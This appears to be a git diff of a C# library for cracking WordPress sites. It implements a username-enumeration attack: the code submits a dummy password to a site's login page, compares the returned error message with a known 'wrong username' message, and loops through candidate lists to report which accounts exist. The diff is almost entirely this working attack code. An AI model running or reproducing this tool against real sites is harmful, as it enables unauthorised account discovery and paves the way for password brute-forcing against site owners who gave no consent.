@@ -15,32 +15,86 @@ namespace Opapps.Lib.WordpressCracker.Services
     public class WordpressUsernameCracker : WordpressCrackerService
     {
         private readonly static IHtmlParser _htmlParser = new HtmlParser();
-        public CultureInfo SiteLanguage { get; set; } = new CultureInfo("en");
-        public string DummyPassword { get; set; } = "aaaaaaaaa";
-        public WordpressUsernameCracker() : base() { }
-        public WordpressUsernameCracker(IRequestConfiguration config) : base(config) { }
+        private readonly IUsernameCrackingConfiguration _config;
+        public WordpressUsernameCracker() : base()
+        {
+            _config = new UsernameCrackingConfiguration();
+        }
 
-        //public async Task<bool> AttemptGettingValidUsername(Uri loginUrl, string username)
-        //{
-        //    using HttpResponseMessage response = await PostAsync(loginUrl, new FormData(username, DummyPassword));
-        //    string htmlContent = await response.Content.ReadAsStringAsync();
+        public WordpressUsernameCracker(IRequestConfiguration requestConfig) : base(requestConfig)
+        {
+            _config = new UsernameCrackingConfiguration();
+        }
 
-        //    string? errorMessage = _htmlParser.GetInnerTextWithXpath("//div[@id = 'login_error']", htmlContent);
+        public WordpressUsernameCracker(IUsernameCrackingConfiguration config) : base()
+        {
+            _config = config;
+        }
 
-        //    if (errorMessage != null) return true;
+        public WordpressUsernameCracker(IUsernameCrackingConfiguration config, IRequestConfiguration requestConfig) : base(requestConfig)
+        {
+            _config = config;
+        }
 
-        //    //errorMessage.
 
-        //}
+        public async Task<bool> AttemptGettingValidUsername(Uri loginUrl, string username)
+        {
+            using HttpResponseMessage response = await PostAsync(loginUrl, new FormData(username, _config.DummyPassword));
+            string htmlContent = await response.Content.ReadAsStringAsync();
 
-        //public async Task<string> AttemptGettingValidUsernameRange()
-        //{
+            string? errorMessage = _htmlParser.GetInnerTextWithXpath("//div[@id = 'login_error']", htmlContent)?.Trim();
 
-        //}
-        //public async Task<List<string>> AttemptGettingValidUsernamesRange()
-        //{
+            return CheckUsernameValid(errorMessage, _config);
 
-        //}
+        }
+
+        /// <summary>
+        /// Check to see for a valid username, and will stop executing after getting a valid username.
+        /// </summary>
+        /// <returns>The valid username if exists, otherwise null</returns>
+        public async Task<string?> AttemptGettingValidUsernameRange(Uri loginUrl, IEnumerable<string> usernames)
+        {
+            foreach(var username in usernames)
+            {
+                bool isValidUsername = await AttemptGettingValidUsername(loginUrl, username);
+                if (isValidUsername) return username;
+            }
+
+            return null;
+        }
+
+        /// <summary>
+        /// Check to see for all valid usernames
+        /// </summary>
+        /// <returns>The valid usernames if any, otherwise null</returns>
+        public async Task<IEnumerable<string>?> AttemptGettingValidUsernamesRange(Uri loginUrl, IEnumerable<string> usernames) 
+        {
+            List<string> validUsernames = new();
+
+            foreach (var username in usernames)
+            {
+                bool isValidUsername = await AttemptGettingValidUsername(loginUrl, username);
+                if (isValidUsername) validUsernames.Add(username);
+            }
+
+            return validUsernames.Any() ? validUsernames : null;
+        }
+
+        private bool CheckUsernameValid(string? errorMessage, IUsernameCrackingConfiguration config)
+        {
+            if (errorMessage == null) return true; // login success, wew. 1/10000 probability.
+
+            if (config.AutoDetectUsernameErrorMessage) {
+                // TODO
+                throw new NotImplementedException("Sorry, for auto-detect username error message feature, currently haven't been implemented");
+            } 
+            
+            // Calculate similarity to check to see if the error message that we get is not a wrong username error message.
+            // If so, then it's the other error message (hopefully is a wrong password error message), return true.
+            // A better way perhaps we also calculate similarity to check if the error message is a wrong password error message,
+            // but it's another work for another day.
+            return !(config.UsernameErrorMessage.CalculateSimilarityWith(errorMessage) > 0.65);
+        }
 
     }
 }
